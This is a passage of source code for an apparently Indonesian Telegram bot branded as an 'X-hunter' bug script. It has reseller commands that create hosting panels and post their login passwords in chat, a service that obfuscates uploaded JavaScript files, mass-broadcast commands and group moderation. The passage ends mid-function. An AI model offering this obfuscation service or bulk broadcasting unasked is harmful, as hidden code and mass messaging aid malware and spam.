"/balanced" = Changing Variable Enc 
"/quantum" = Quantum Encryption vip
"/fortress" = Fortress Encryption vip
"/phantomx" = PhantomX Encryption vip

⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Kembali", callback_data: "/all_menu", style: "success", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(EncryptMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di Encrypt menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/cpanel_menu', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const cpanel_menuMenu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖢𝖱𝖤𝖠𝖳𝖤 𝖯𝖠𝖭𝖤𝖫 𝖬𝖤𝖭𝖴 ⊰—═⬡
"/1gb" = Create Panel 1gb
"/2gb" = Create Panel 2gb
"/3gb" = Create Panel 3gb
"/4gb" = Create Panel 4gb
"/5gb" = Create Panel 5gb
"/6gb" = Create Panel 6gb
"/7gb" = Create Panel 7gb
"/8gb" = Create Panel 8gb
"/9gb" = Create Panel 9gb
"/10gb" = Create Panel 10gb
"/unli" = Create Panel Unlimited

⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Next", callback_data: "/owner_panel", style: "success", icon_custom_emoji_id:  "4956282853882069908" },
        ],
        [
            { text: "Kembali", callback_data: "/all_menu", style: "Primary", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(cpanel_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di cpanel_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/owner_panel', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const owner_panelMenu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖲𝖤𝖳𝖳𝖨𝖭𝖦 𝖮𝖶𝖭𝖤𝖱 𝖢𝖯𝖠𝖭𝖤𝖫 ⊰—═⬡
"/status" = Check Status Panel
"/statuscpu" = Check Status CPU
"/servercpu" = Check Server CPU
"/totalserver" = Check total Server 
"/listsrv" = Check list Server
"/addowner" = Add Akses Owner
"/delowner" = Hapus Akses Owner
"/listowner" = Melihat List Owner
"/addpartner" = Add Akses Partner 
"/delpartner" = Hapus Akses Partner 
"/listpartner" = Melihat List Partner 
"/addreseller" = Add Akses Resseler 
"/delreseller" = Hapus Akses Resseler
"/listreseller" = Melihat List Resseler

⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Kembali", callback_data: "/cpanel_menu", style: "Primary", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(owner_panelMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di owner_panel menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

//------------------(AWAL OF ROLE FITUR)--------------------//
bot.command("addowner", async (ctx) => {
  try {
    if (!isMainOwner(ctx.from.id)) {
      return ctx.reply("❌ Hanya main owner yang bisa menambah owner.");
    }

    const userId = getTargetUserIdFromCommand(ctx);
    if (!userId) {
      return ctx.reply("❌ Format:\n/addowner 123456789\natau reply user lalu /addowner");
    }

    if (String(userId) === String(ownerID)) {
      return ctx.reply("❌ User ini sudah main owner.");
    }

    const res = addUserToRole(OWNER_USERS_FILE, userId);
    return ctx.reply(res.ok ? `✅ Owner ditambahkan: ${userId}` : `❌ ${res.message}`);
  } catch (err) {
    console.log("ADDOWNER ERROR:", err.message);
    return ctx.reply("❌ Gagal add owner.");
  }
});

bot.command("delowner", async (ctx) => {
  try {
    if (!isMainOwner(ctx.from.id)) {
      return ctx.reply("❌ Hanya main owner yang bisa menghapus owner.");
    }

    const userId = getTargetUserIdFromCommand(ctx);
    if (!userId) {
      return ctx.reply("❌ Format:\n/delowner 123456789\natau reply user lalu /delowner");
    }

    const res = removeUserFromRole(OWNER_USERS_FILE, userId);
    return ctx.reply(res.ok ? `✅ Owner dihapus: ${userId}` : `❌ ${res.message}`);
  } catch (err) {
    console.log("DELOWNER ERROR:", err.message);
    return ctx.reply("❌ Gagal del owner.");
  }
});

bot.command("listowner", async (ctx) => {
  try {
    if (!isOwnerAccess(ctx.from.id)) {
      return ctx.reply("❌ Hanya owner yang bisa melihat list owner.");
    }

    const users = listRoleUsers(OWNER_USERS_FILE);
    const text = users.length
      ? `👑 List Owner\n\n${users.map((id, i) => `${i + 1}. ${id}`).join("\n")}`
      : "📭 Tidak ada owner tambahan.";

    return ctx.reply(text);
  } catch (err) {
    console.log("LISTOWNER ERROR:", err.message);
    return ctx.reply("❌ Gagal ambil list owner.");
  }
});

bot.command("addpartner", async (ctx) => {
  try {
    if (!isOwnerAccess(ctx.from.id)) {
      return ctx.reply("❌ Hanya owner yang bisa add partner.");
    }

    const userId = getTargetUserIdFromCommand(ctx);
    if (!userId) {
      return ctx.reply("❌ Format:\n/addpartner 123456789\natau reply user lalu /addpartner");
    }

    const res = addUserToRole(PARTNER_USERS_FILE, userId);
    return ctx.reply(res.ok ? `✅ Partner ditambahkan: ${userId}` : `❌ ${res.message}`);
  } catch (err) {
    console.log("ADDPARTNER ERROR:", err.message);
    return ctx.reply("❌ Gagal add partner.");
  }
});

bot.command("delpartner", async (ctx) => {
  try {
    if (!isOwnerAccess(ctx.from.id)) {
      return ctx.reply("❌ Hanya owner yang bisa del partner.");
    }

    const userId = getTargetUserIdFromCommand(ctx);
    if (!userId) {
      return ctx.reply("❌ Format:\n/delpartner 123456789\natau reply user lalu /delpartner");
    }

    const res = removeUserFromRole(PARTNER_USERS_FILE, userId);
    return ctx.reply(res.ok ? `✅ Partner dihapus: ${userId}` : `❌ ${res.message}`);
  } catch (err) {
    console.log("DELPARTNER ERROR:", err.message);
    return ctx.reply("❌ Gagal del partner.");
  }
});

bot.command("listpartner", async (ctx) => {
  try {
    if (!isOwnerAccess(ctx.from.id) && !isPartnerAccess(ctx.from.id)) {
      return ctx.reply("❌ Tidak punya akses.");
    }

    const users = listRoleUsers(PARTNER_USERS_FILE);
    const text = users.length
      ? `🤝 List Partner\n\n${users.map((id, i) => `${i + 1}. ${id}`).join("\n")}`
      : "📭 Tidak ada partner.";

    return ctx.reply(text);
  } catch (err) {
    console.log("LISTPARTNER ERROR:", err.message);
    return ctx.reply("❌ Gagal ambil list partner.");
  }
});

bot.command("addreseller", async (ctx) => {
  try {
    if (!isOwnerAccess(ctx.from.id) && !isPartnerAccess(ctx.from.id)) {
      return ctx.reply("❌ Hanya owner / partner yang bisa add reseller.");
    }

    const userId = getTargetUserIdFromCommand(ctx);
    if (!userId) {
      return ctx.reply("❌ Format:\n/addreseller 123456789\natau reply user lalu /addreseller");
    }

    const res = addUserToRole(RESELLER_USERS_FILE, userId);
    return ctx.reply(res.ok ? `✅ Reseller ditambahkan: ${userId}` : `❌ ${res.message}`);
  } catch (err) {
    console.log("ADDRESELLER ERROR:", err.message);
    return ctx.reply("❌ Gagal add reseller.");
  }
});

bot.command("delreseller", async (ctx) => {
  try {
    if (!isOwnerAccess(ctx.from.id) && !isPartnerAccess(ctx.from.id)) {
      return ctx.reply("❌ Hanya owner / partner yang bisa del reseller.");
    }

    const userId = getTargetUserIdFromCommand(ctx);
    if (!userId) {
      return ctx.reply("❌ Format:\n/delreseller 123456789\natau reply user lalu /delreseller");
    }

    const res = removeUserFromRole(RESELLER_USERS_FILE, userId);
    return ctx.reply(res.ok ? `✅ Reseller dihapus: ${userId}` : `❌ ${res.message}`);
  } catch (err) {
    console.log("DELRESELLER ERROR:", err.message);
    return ctx.reply("❌ Gagal del reseller.");
  }
});

bot.command("listreseller", async (ctx) => {
  try {
    if (!hasPanelAccess(ctx.from.id)) {
      return ctx.reply("❌ Tidak punya akses.");
    }

    const users = listRoleUsers(RESELLER_USERS_FILE);
    const text = users.length
      ? `🛒 List Reseller\n\n${users.map((id, i) => `${i + 1}. ${id}`).join("\n")}`
      : "📭 Tidak ada reseller.";

    return ctx.reply(text);
  } catch (err) {
    console.log("LISTRESELLER ERROR:", err.message);
    return ctx.reply("❌ Gagal ambil list reseller.");
  }
});


//------------------(AWAL OF CPANEL FITUR)--------------------//
const panelCommands = [
  "1gb", "2gb", "3gb", "4gb", "5gb",
  "6gb", "7gb", "8gb", "9gb", "10gb", "unli"
];

panelCommands.forEach((cmd) => {
  bot.command(cmd, async (ctx) => {
    try {
      if (!hasPanelAccess(ctx.from.id)) {
        return ctx.reply("❌ Kamu tidak punya akses reseller / partner / owner.");
      }

      const cd = checkCooldown(ctx);
      if (cd) return ctx.reply(cd);

      const args = ctx.message.text.trim().split(/\s+/).slice(1);

      if (args.length < 2) {
        return ctx.reply(
          `❌ Format salah\n\n` +
          `Contoh:\n` +
          `/${cmd} userpanel @username\n` +
          `atau\n` +
          `/${cmd} userpanel 123456789`
        );
      }

      const username = String(args[0] || "").trim().toLowerCase();
      const telegramTarget = String(args[1] || "").trim();

      if (!username || !telegramTarget) {
        return ctx.reply(
          `❌ Format salah\n\n` +
          `Contoh:\n` +
          `/${cmd} userpanel @username\n` +
          `atau\n` +
          `/${cmd} userpanel 123456789`
        );
      }

      if (!/^[a-zA-Z0-9_]+$/.test(username)) {
        return ctx.reply("❌ Username panel hanya boleh huruf, angka, dan underscore.");
      }

      const isValidTelegramInput =
        /^@\w{5,}$/.test(telegramTarget) || /^\d{5,20}$/.test(telegramTarget);

      if (!isValidTelegramInput) {
        return ctx.reply("❌ Target harus berupa username Telegram (@username) atau ID Telegram.");
      }

      const specs = buildPanelSpecs(cmd);
      if (!specs) {
        return ctx.reply("❌ Paket panel tidak valid.");
      }

      await ctx.reply("⏳ Sedang membuat panel...");

      const createdUser = await createPanelUser(username, telegramTarget, 1);

      const createdServer = await createPanelServer({
        username,
        userId: createdUser.user.id,
        specs,
        version: 1
      });

      const resultText =
        `✅ PANEL BERHASIL DIBUAT\n\n` +
        `👤 Username Panel: ${username}\n` +
        `🎯 Target Telegram: ${telegramTarget}\n\n` +
        `📧 Email: ${createdUser.email}\n` +
        `🔑 Password: ${createdUser.password}\n` +
        `🆔 User ID Panel: ${createdUser.user.id}\n` +
        `🖥️ Server ID: ${createdServer.id}\n` +
        `💾 RAM: ${specs.memory === 0 ? "Unlimited" : specs.memory + " MB"}\n` +
        `📦 Disk: ${specs.disk === 0 ? "Unlimited" : specs.disk + " MB"}\n` +
        `⚙️ CPU: ${specs.cpu === 0 ? "Unlimited" : specs.cpu + "%"}\n` +
        `🌐 Login: ${domain}`;

      await ctx.reply(resultText);

      // optional kirim ke target kalau target berupa ID Telegram
      if (/^\d{5,20}$/.test(telegramTarget)) {
        try {
          await ctx.telegram.sendMessage(telegramTarget, resultText);
        } catch (e) {
          console.log("SEND TO TELEGRAM ID ERROR:", e.message);
        }
      }

      // optional log ke owner / log group
      try {
        if (LOG_CHAT_ID) {
          await ctx.telegram.sendMessage(
            LOG_CHAT_ID,
            `📥 CREATE PANEL LOG\n\n` +
            `👤 By: ${ctx.from.first_name} (${ctx.from.id})\n` +
            `⚙️ Paket: /${cmd}\n` +
            `🧾 Username: ${username}\n` +
            `🎯 Target: ${telegramTarget}\n` +
            `🖥️ Server ID: ${createdServer.id}`
          );
        }
      } catch (e) {
        console.log("PANEL LOG ERROR:", e.message);
      }

    } catch (err) {
      console.log(`CREATE PANEL ${cmd.toUpperCase()} ERROR:`, err.response?.data || err.message);

      const apiError =
        err.response?.data?.errors?.[0]?.detail ||
        err.response?.data?.errors?.[0]?.meta?.rule ||
        err.message;

      return ctx.reply(`❌ Gagal membuat panel\n📝 Error: ${apiError}`);
    }
  });
});

bot.command("status", async (ctx) => {
  try {
    const cd = checkCooldown(ctx);
    if (cd) return ctx.reply(cd);

    const data = await fetchPanel("/api/application/nodes", 1, "GET");

    const totalNodes = Array.isArray(data?.data) ? data.data.length : 0;

    const text =
      `✅ Panel terhubung\n\n` +
      `🌐 Domain: ${domain}\n` +
      `📦 Total Nodes: ${totalNodes}\n` +
      `🔑 API: ACTIVE`;

    return ctx.reply(text);
  } catch (err) {
    console.log("STATUS ERROR:", err.response?.data || err.message);
    return ctx.reply(
      `❌ Gagal cek status panel\n` +
      `🌐 Domain: ${domain}\n` +
      `📝 Error: ${err.response?.data?.errors?.[0]?.detail || err.message}`
    );
  }
});

bot.command("servercpu", async (ctx) => {
  try {
    const cd = checkCooldown(ctx);
    if (cd) return ctx.reply(cd);

    const data = await fetchPanel("/api/application/servers", 1, "GET");

    const servers = Array.isArray(data?.data) ? data.data : [];
    const total = servers.length;

    let totalMemory = 0;
    let totalDisk = 0;
    let totalCpu = 0;

    for (const srv of servers) {
      const limits = srv?.attributes?.limits || {};
      totalMemory += Number(limits.memory || 0);
      totalDisk += Number(limits.disk || 0);
      totalCpu += Number(limits.cpu || 0);
    }

    const text =
      `📊 Statistik Server Panel\n\n` +
      `🖥️ Total Server: ${total}\n` +
      `💾 Total RAM: ${totalMemory} MB\n` +
      `📦 Total Disk: ${totalDisk} MB\n` +
      `⚙️ Total CPU: ${totalCpu}%`;

    return ctx.reply(text);
  } catch (err) {
    console.log("SERVERCPU ERROR:", err.response?.data || err.message);
    return ctx.reply(
      `❌ Gagal mengambil statistik server\n` +
      `📝 Error: ${err.response?.data?.errors?.[0]?.detail || err.message}`
    );
  }
});

bot.command("statuscpu", async (ctx) => {
  try {
    const data = loadJsonData(CPU_CHECK_STATUS_FILE, { enabled: false });

    const text =
      `🧠 Status Monitor CPU\n\n` +
      `📌 Status: ${data.enabled ? "ON" : "OFF"}`;

    return ctx.reply(text);
  } catch (err) {
    console.log("STATUSCPU ERROR:", err.message);
    return ctx.reply("❌ Gagal membaca status CPU monitor");
  }
});

bot.command("totalserver", async (ctx) => {
  try {
    const cd = checkCooldown(ctx);
    if (cd) return ctx.reply(cd);

    let resultText = `📦 Total Server per Versi\n\n`;

    for (let i = 1; i <= 7; i++) {
      try {
        const cfg = getPanelConfig(i);
        if (!cfg || !cfg.domain || !cfg.plta) {
          resultText += `V${i}: Config belum diisi\n`;
          continue;
        }

        const data = await fetchPanel("/api/application/servers", i, "GET");
        const total = Array.isArray(data?.data) ? data.data.length : 0;

        resultText += `V${i}: ${total} server\n`;
      } catch (e) {
        resultText += `V${i}: Error\n`;
      }
    }

    return ctx.reply(resultText);
  } catch (err) {
    console.log("TOTALSERVER ERROR:", err.message);
    return ctx.reply("❌ Gagal mengambil total server");
  }
});

bot.command("listsrv", async (ctx) => {
  try {
    const cd = checkCooldown(ctx);
    if (cd) return ctx.reply(cd);

    const data = await fetchPanel("/api/application/servers", 1, "GET");
    const servers = Array.isArray(data?.data) ? data.data : [];

    if (!servers.length) {
      return ctx.reply("❌ Tidak ada server");
    }

    let text = `📋 List Server Panel\n\n`;

    servers.slice(0, 20).forEach((srv, index) => {
      const a = srv.attributes || {};
      text +=
        `${index + 1}. ${a.name || "Tanpa Nama"}\n` +
        `🆔 ID: ${a.id}\n` +
        `👤 User ID: ${a.user}\n` +
        `🧠 RAM: ${a.limits?.memory || 0} MB\n` +
        `💽 Disk: ${a.limits?.disk || 0} MB\n` +
        `⚙️ CPU: ${a.limits?.cpu || 0}%\n\n`;
    });

    return ctx.reply(text);
  } catch (err) {
    console.log("LISTSRV ERROR:", err.response?.data || err.message);
    return ctx.reply(
      `❌ Gagal mengambil list server\n` +
      `📝 Error: ${err.response?.data?.errors?.[0]?.detail || err.message}`
    );
  }
});


//------------------(AWAL OF ENCRYPT FITUR)--------------------//
const encryptCommands = [
  "rosemary",
  "phantom",
  "hardcore",
  "artillery",
  "balanced",
  "quantum",
  "fortress",
  "phantomx"
];

encryptCommands.forEach((cmd) => {
  bot.command(cmd, async (ctx) => {
    try {
      const reply = ctx.message.reply_to_message;
      if (!reply || !reply.document) {
        return ctx.reply("❌ Reply file .js yang mau di encrypt");
      }

      const fileName = reply.document.file_name || "file.js";
      if (!fileName.endsWith(".js")) {
        return ctx.reply("❌ Hanya support file .js");
      }

      await ctx.reply("⏳ Processing encrypt...");

      const buffer = await downloadFile(ctx, reply.document.file_id);
      const code = buffer.toString("utf8");

      const result = await JsConfuser.obfuscate(code, baseConfig);

      const finalCode =
        typeof result === "string"
          ? result
          : typeof result?.code === "string"
          ? result.code
          : JSON.stringify(result, null, 2);

      const outputPath = path.join(__dirname, `enc_${Date.now()}.js`);
      fs.writeFileSync(outputPath, finalCode, "utf8");

      await ctx.replyWithDocument({
        source: outputPath,
        filename: `encrypted_${fileName}`
      });
      
         // 🔥 LOG DI SINI
      await sendEncryptLog(ctx, cmd, fileName);
      
      try {
        fs.unlinkSync(outputPath);
      } catch {}

    } catch (err) {
      console.log("ENCRYPT ERROR:", err);
      ctx.reply("❌ Gagal encrypt file");
    }
  });
});

async function sendEncryptLog(ctx, command, fileName) {
  try {
    const user = ctx.from;
    const name = [user.first_name, user.last_name].filter(Boolean).join(" ");
    const username = user.username ? `@${user.username}` : "-";

    const logText =
      `🔐 ENCRYPT USED\n\n` +
      `👤 User: ${name}\n` +
      `🆔 ID: ${user.id}\n` +
      `🔗 Username: ${username}\n\n` +
      `⚙️ Command: /${command}\n` +
      `📄 File: ${fileName}\n\n` +
      `🕒 Time: ${new Date().toLocaleString()}`;

    await ctx.telegram.sendMessage(LOG_CHAT_ID, logText);
  } catch (err) {
    console.log("LOG ERROR:", err.message);
  }
}

async function downloadFile(ctx, fileId) {
  const link = await ctx.telegram.getFileLink(fileId);
  const res = await fetch(link.href);
  const arrayBuffer = await res.arrayBuffer();
  return Buffer.from(arrayBuffer);
}

//------------------(AWAL OF JASHER FITUR)--------------------//
const userDb = new Set();   // private users yang pernah start / interaksi
const groupDb = new Set();  // grup tempat bot aktif

function isOwner(ctx) {
  return ctx.from && ctx.from.id === ownerID;
}

bot.command("bcuser", async (ctx) => {
  try {
    if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

    const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!text) {
      return ctx.reply("❌ Format:\n/bcuser isi pesan");
    }

    if (userDb.size === 0) {
      return ctx.reply("❌ Belum ada user private yang tersimpan.");
    }

    let success = 0;
    let failed = 0;

    await ctx.reply(`⏳ Mengirim broadcast ke ${userDb.size} private chat...`);

    for (const userId of userDb) {
      try {
        await ctx.telegram.sendMessage(userId, text);
        success++;
      } catch {
        failed++;
      }
    }

    return ctx.reply(
      `✅ Broadcast private selesai.\nBerhasil: ${success}\nGagal: ${failed}`
    );
  } catch (err) {
    console.log("BCUSER ERROR:", err.message);
    return ctx.reply("❌ Gagal broadcast ke private chat.");
  }
});

bot.command("bcgroup", async (ctx) => {
  try {
    if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

    const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!text) {
      return ctx.reply("❌ Format:\n/bcgroup isi pesan");
    }

    if (groupDb.size === 0) {
      return ctx.reply("❌ Belum ada group yang tersimpan.");
    }

    let success = 0;
    let failed = 0;

    await ctx.reply(`⏳ Mengirim broadcast ke ${groupDb.size} group...`);

    for (const groupId of groupDb) {
      try {
        await ctx.telegram.sendMessage(groupId, text);
        success++;
      } catch {
        failed++;
      }
    }

    return ctx.reply(
      `✅ Broadcast group selesai.\nBerhasil: ${success}\nGagal: ${failed}`
    );
  } catch (err) {
    console.log("BCGROUP ERROR:", err.message);
    return ctx.reply("❌ Gagal broadcast ke group.");
  }
});

bot.command("bcall", async (ctx) => {
  try {
    if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

    const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!text) {
      return ctx.reply("❌ Format:\n/bcall isi pesan");
    }

    const targets = [...new Set([...userDb, ...groupDb])];

    if (targets.length === 0) {
      return ctx.reply("❌ Belum ada target broadcast.");
    }

    let success = 0;
    let failed = 0;

    await ctx.reply(`⏳ Mengirim broadcast ke ${targets.length} chat...`);

    for (const chatId of targets) {
      try {
        await ctx.telegram.sendMessage(chatId, text);
        success++;
      } catch {
        failed++;
      }
    }

    return ctx.reply(
      `✅ Broadcast semua chat selesai.\nBerhasil: ${success}\nGagal: ${failed}`
    );
  } catch (err) {
    console.log("BCALL ERROR:", err.message);
    return ctx.reply("❌ Gagal broadcast.");
  }
});

bot.command("sharemsg", async (ctx) => {
  try {
    if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

    const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!text) {
      return ctx.reply("❌ Format:\n/sharemsg isi pesan");
    }

    if (userDb.size === 0) {
      return ctx.reply("❌ Tidak ada private chat tersimpan.");
    }

    let success = 0;
    let failed = 0;

    await ctx.reply(`⏳ Mengirim sharemsg ke ${userDb.size} private chat...`);

    for (const userId of userDb) {
      try {
        await ctx.telegram.sendMessage(userId, text);
        success++;
      } catch {
        failed++;
      }
    }

    return ctx.reply(
      `✅ Sharemsg selesai.\nBerhasil: ${success}\nGagal: ${failed}`
    );
  } catch (err) {
    console.log("SHAREMSG ERROR:", err.message);
    return ctx.reply("❌ Gagal kirim sharemsg.");
  }
});

bot.command("bcuserreply", async (ctx) => {
  try {
    if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

    const replied = ctx.message.reply_to_message;
    if (!replied) {
      return ctx.reply("❌ Reply pesan yang mau di-broadcast.");
    }

    let success = 0;
    let failed = 0;

    for (const userId of userDb) {
      try {
        await ctx.telegram.forwardMessage(
          userId,
          ctx.chat.id,
          replied.message_id
        );
        success++;
      } catch {
        failed++;
      }
    }

    return ctx.reply(`✅ Selesai.\nBerhasil: ${success}\nGagal: ${failed}`);
  } catch (err) {
    console.log("BCUSERREPLY ERROR:", err.message);
    return ctx.reply("❌ Gagal.");
  }
});

bot.command("sharemsgreply", async (ctx) => {
  try {
    if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

    const replied = ctx.message.reply_to_message;
    if (!replied) {
      return ctx.reply("❌ Reply pesan yang mau di-share.");
    }

    let success = 0;
    let failed = 0;

    for (const userId of userDb) {
      try {
        await ctx.telegram.copyMessage(
          userId,
          ctx.chat.id,
          replied.message_id
        );
        success++;
      } catch {
        failed++;
      }
    }

    return ctx.reply(`✅ Sharemsg reply selesai.\nBerhasil: ${success}\nGagal: ${failed}`);
  } catch (err) {
    console.log("SHAREMSGREPLY ERROR:", err.message);
    return ctx.reply("❌ Gagal.");
  }
});

bot.command("totalchat", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }
  return ctx.reply(
    `📊 Total data chat:\n` +
    `👤 Private: ${userDb.size}\n` +
    `👥 Group: ${groupDb.size}\n` +
    `🧩 Semua: ${new Set([...userDb, ...groupDb]).size}`
  );
});
//------------------(AKHIR OF JASHER FITUR)--------------------//

//------------------(AWAL OF JAGA GROUP)--------------------//
// storage simple (memory)
const warns = new Map();
// format:
// `${chatId}:${userId}` => jumlah warn

async function isAdmin(ctx, userId) {
  const member = await ctx.getChatMember(userId);
  return ["creator", "administrator"].includes(member.status);
}

// /warn [alasan]
// reply ke user
bot.command("warn", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const senderIsAdmin = await isAdmin(ctx, ctx.from.id);
    if (!senderIsAdmin) {
      return ctx.reply("❌ Hanya admin yang bisa memberi warn.");
    }

    const replied = ctx.message.reply_to_message;
    if (!replied) {
      return ctx.reply("❌ Reply pesan user yang mau di-warn.");
    }

    const target = replied.from;
    if (!target || target.is_bot) {
      return ctx.reply("❌ User tidak valid.");
    }

    const targetMember = await ctx.getChatMember(target.id);
    if (["creator", "administrator"].includes(targetMember.status)) {
      return ctx.reply("❌ Tidak bisa warn admin.");
    }

    const reason = ctx.message.text.split(" ").slice(1).join(" ").trim() || "Tanpa alasan";
    const key = `${ctx.chat.id}:${target.id}`;
    const total = (warns.get(key) || 0) + 1;

    warns.set(key, total);

    return ctx.reply(
      `⚠️ Warn diberikan ke ${target.first_name}.\n` +
      `📝 Alasan: ${reason}\n` +
      `📌 Total warn: ${total}`
    );
  } catch (err) {
    console.log("WARN ERROR:", err.message);
    return ctx.reply("❌ Gagal memberi warn.");
  }
});

// /warnings
// reply ke user
bot.command("warnings", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const replied = ctx.message.reply_to_message;
    if (!replied) {
      return ctx.reply("❌ Reply user yang mau dicek warn-nya.");
    }

    const target = replied.from;
    const key = `${ctx.chat.id}:${target.id}`;
    const total = warns.get(key) || 0;

    return ctx.reply(
      `📌 Total warn ${target.first_name}: ${total}`
    );
  } catch (err) {
    console.log("WARNINGS ERROR:", err.message);
    return ctx.reply("❌ Gagal cek warn.");
  }
});

// /unwarn
// reply ke user
bot.command("unwarn", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const senderIsAdmin = await isAdmin(ctx, ctx.from.id);
    if (!senderIsAdmin) {
      return ctx.reply("❌ Hanya admin yang bisa mengurangi warn.");
    }

    const replied = ctx.message.reply_to_message;
    if (!replied) {
      return ctx.reply("❌ Reply user yang mau dikurangi warn-nya.");
    }

    const target = replied.from;
    const key = `${ctx.chat.id}:${target.id}`;
    const total = warns.get(key) || 0;

    if (total <= 0) {
      return ctx.reply("❌ User ini belum punya warn.");
    }

    const newTotal = total - 1;

    if (newTotal <= 0) {
      warns.delete(key);
    } else {
      warns.set(key, newTotal);
    }

    return ctx.reply(
      `✅ Warn ${target.first_name} dikurangi.\n` +
      `📌 Total warn sekarang: ${newTotal < 0 ? 0 : newTotal}`
    );
  } catch (err) {
    console.log("UNWARN ERROR:", err.message);
    return ctx.reply("❌ Gagal mengurangi warn.");
  }
});

// /clearwarn
// reply ke user
bot.command("clearwarn", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const senderIsAdmin = await isAdmin(ctx, ctx.from.id);
    if (!senderIsAdmin) {
      return ctx.reply("❌ Hanya admin yang bisa reset warn.");
    }

    const replied = ctx.message.reply_to_message;
    if (!replied) {
      return ctx.reply("❌ Reply user yang mau direset warn-nya.");
    }

    const target = replied.from;
    const key = `${ctx.chat.id}:${target.id}`;

    warns.delete(key);

    return ctx.reply(`✅ Semua warn ${target.first_name} berhasil direset.`);
  } catch (err) {
    console.log("CLEARWARN ERROR:", err.message);
    return ctx.reply("❌ Gagal reset warn.");
  }
});

// helper parse durasi: 10m, 2h, 1d
function parseDuration(input) {
  if (!input) return null;

  const match = input.toLowerCase().match(/^(\d+)(m|h|d)$/);
  if (!match) return null;

  const value = parseInt(match[1], 10);
  const unit = match[2];

  if (unit === "m") return value * 60;
  if (unit === "h") return value * 60 * 60;
  if (unit === "d") return value * 24 * 60 * 60;

  return null;
}

// helper cek admin
async function isAdmin(ctx, userId) {
  const member = await ctx.getChatMember(userId);
  return ["creator", "administrator"].includes(member.status);
}

// /mute 10m
// reply user lalu /mute 10m
bot.command("mute", async (ctx) => {
  try {
